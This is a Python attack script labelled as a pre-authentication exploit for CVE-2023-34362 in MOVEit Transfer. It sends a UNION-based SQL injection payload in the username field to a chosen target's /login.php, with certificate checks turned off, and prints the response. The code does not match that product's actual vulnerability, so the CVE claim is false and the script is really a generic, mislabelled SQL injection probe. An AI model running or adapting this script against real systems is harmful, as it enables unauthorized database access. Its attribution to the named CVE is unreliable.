#!/usr/bin/env python3
"""
Exploit for CVE-2023-34362: SQL Injection in MOVEit Transfer (Pre-Auth)
Educational Purposes Only - Use Responsibly!
"""
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(target):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Payload para extraer nombres de tablas (ajustable)
    payload = "test' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables-- -"
    
    data = {
        "username": payload,
        "password": "anything"
    }
    
    try:
        print(f"[*] Target: {target}")
        print(f"[*] Sending payload: {payload}")
        
        response = requests.post(
            f"{target}/login.php",
            data=data,
            headers=headers,
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            if "error" not in response.text.lower():
                print("[+] Possible SQL Injection Success!")
                print("[+] Response Snippet:")
                print(response.text[:500])  # Muestra parte de la respuesta
            else:
                print("[-] Target not vulnerable or payload failed.")
        else:
            print(f"[-] HTTP Error: {response.status_code}")
    
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., https://vulnerable-site.com)")
    args = parser.parse_args()
    
    exploit(args.target)